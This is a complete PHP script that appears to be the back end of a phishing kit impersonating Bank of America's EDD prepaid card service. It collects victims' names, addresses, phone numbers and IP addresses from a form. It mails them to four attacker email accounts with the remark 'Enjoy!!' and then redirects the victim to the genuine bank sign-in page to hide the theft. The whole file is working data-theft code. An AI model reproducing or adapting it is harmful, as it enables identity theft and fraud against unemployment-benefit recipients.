<?php

$subject = " EDD INFO FROM [ ".$_SERVER['REMOTE_ADDR']." ] ";



$ip = $_SERVER['REMOTE_ADDR'];

$email = $_POST['name']."\n";
$message = "Name: ".$_POST["name"]."\n";
$message .= "Address: ".$_POST["address"]."\n";
$message .= "City: ".$_POST["City"]."\n";
$message .= "State: ".$_POST["state"]."\n";
$message .= "Zip Code: ".$_POST["zipcode"]."\n";
$message .= "Phone Number: ".$_POST["phonenumber"]."\n";
$message .=  "I.p: " .$ip."\n" ."\n" ;
$message .=  "Enjoy!!" ."\n";
$headers = 'From: Logins@waya.com' . "\r\n" . 'Reply-To: Logins@waya.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();





mail ("hushnshedd@protonmail.com, hushedd@yandex.com, hushnsh@gmail.com, hushnsh@yahoo.com",$subject,$message, $headers);



header("location: https://prepaid.bankofamerica.com/eddcard/verify/signin?Logout=True"); 



?>